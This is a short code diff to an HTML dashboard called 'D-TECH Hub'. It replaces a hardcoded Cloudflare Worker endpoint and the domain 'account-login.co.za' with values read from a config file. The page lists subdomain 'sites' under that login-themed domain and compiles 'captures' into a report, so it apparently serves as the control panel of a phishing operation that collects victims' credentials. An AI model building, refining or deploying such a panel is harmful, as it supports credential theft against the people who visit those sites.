@@ -5,6 +5,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>D-TECH Hub | Dashboard</title>
+    <script src="config.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <style>
         :root {
@@ -340,7 +341,7 @@
     <div id="notification" class="notification">Message</div>
 
     <script>
-        const WORKER_URL = 'https://calm-bread-1d99.testdx24.workers.dev';
+        const WORKER_URL = CONFIG.API_URL;
         const userCode = localStorage.getItem('user_code');
         let currentData = [];
 
@@ -398,7 +399,7 @@
             }
 
             sites.forEach(site => {
-                const url = `https://${site.subdomain}.account-login.co.za`;
+                const url = `https://${site.subdomain}.${CONFIG.ROOT_DOMAIN}`;
                 const div = document.createElement('div');
                 div.style.background = 'var(--bg-card)';
                 div.style.border = '1px solid var(--border)';
@@ -673,7 +674,7 @@
 
             return {
                 header: "PREASX24 - X24 SYSTEM",
-                source: filterVal === 'all' ? "All Active Sites" : `https://${filterVal}.account-login.co.za`,
+                source: filterVal === 'all' ? "All Active Sites" : `https://${filterVal}.${CONFIG.ROOT_DOMAIN}`,
                 captures: captures,
                 footer: "POWERED BY DTECH"
             };
